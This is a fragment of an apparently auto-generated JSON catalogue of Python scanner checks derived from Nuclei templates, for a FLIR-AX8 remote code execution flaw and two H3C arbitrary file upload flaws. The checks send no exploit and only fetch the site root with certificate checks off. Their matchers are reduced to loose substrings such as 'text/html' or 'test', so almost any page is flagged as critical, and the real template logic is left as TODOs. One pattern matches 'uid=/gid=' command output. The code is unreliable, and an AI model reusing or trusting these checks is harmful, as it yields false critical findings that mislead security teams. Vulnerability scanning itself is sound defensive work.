        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: flir-ax8-rce\nName: FLIR-AX8 res.php - Remote Code Execution\nSeverity: critical\nDescription: Remote Command Execution vulnerability in the FLIR-AX8 res.php file, the attacker obtains server permissions after logging in to the background with the default password.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_flir_ax8_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"flir-ax8-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"FLIR-AX8 res.php - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: contains_all(to_lower(header_1), 'text/html','phpsessid','showcameraid'); contains(body_1, 'success') | regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['text/html', 'phpsessid', 'showcameraid', 'success', 'uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"FLIR-AX8 res.php - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_flir_ax8_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: flir-ax8-rce\nName: FLIR-AX8 res.php - Remote Code Execution\nSeverity: critical\nDescription: Remote Command Execution vulnerability in the FLIR-AX8 res.php file, the attacker obtains server permissions after logging in to the background with the default password.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_flir_ax8_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"flir-ax8-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"FLIR-AX8 res.php - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: contains_all(to_lower(header_1), 'text/html','phpsessid','showcameraid'); contains(body_1, 'success') | regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['text/html', 'phpsessid', 'showcameraid', 'success', 'uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"FLIR-AX8 res.php - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_flir_ax8_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "flir-ax8",
          "rce",
          "exploitdb",
          "iot",
          "sensor",
          "authenticated",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_h3c_cnsss_arbitrary_file_upload",
        "name": "H3C CNSSS - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "H3C-Campus Network Self-Service System vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(body_2,\"{{md5(num)}}\"); status_code_1 == 200 && status_code_2 == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(10)}}"
          },
          {
            "name": "num",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: num",
            "default": "{{rand_int(1000, 9999)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: h3c-cnsss-arbitrary-file-upload\nName: H3C CNSSS - Arbitrary File Upload\nSeverity: critical\nDescription: H3C-Campus Network Self-Service System vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_h3c_cnsss_arbitrary_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"h3c-cnsss-arbitrary-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"H3C CNSSS - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body_2,\"{{md5(num)}}\"); status_code_1 == 200 && status_code_2 == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"H3C CNSSS - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_h3c_cnsss_arbitrary_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: h3c-cnsss-arbitrary-file-upload\nName: H3C CNSSS - Arbitrary File Upload\nSeverity: critical\nDescription: H3C-Campus Network Self-Service System vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_h3c_cnsss_arbitrary_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"h3c-cnsss-arbitrary-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"H3C CNSSS - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: contains(body_2,\"{{md5(num)}}\"); status_code_1 == 200 && status_code_2 == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"H3C CNSSS - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_h3c_cnsss_arbitrary_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "h3c",
          "lfi",
          "instrusive",
          "file-upload",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_h3c_cvm_arbitrary_file_upload",
        "name": "H3C CVM - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "An H3C CVM vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.",
        "severity": "critical",
        "detection": "[AND] mot(s) '{{payload}}' | mot(s) 'Content-Type: text/html' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{rand_base(5)}}"
          },
          {
            "name": "payload",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: payload",
            "default": "{{rand_base(8)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: h3c-cvm-arbitrary-file-upload\nName: H3C CVM - Arbitrary File Upload\nSeverity: critical\nDescription: An H3C CVM vulnerability allows for arbitrary file uploads. This enables attackers to upload any files they choose, acquire webshells, manipulate server permissions, and access sensitive information.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_h3c_cvm_arbitrary_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"h3c-cvm-arbitrary-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"H3C CVM - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{payload}}' | mot(s) 'Content-Type: text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{payload}}', 'Content-Type: text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"H3C CVM - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_h3c_cvm_arbitrary_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
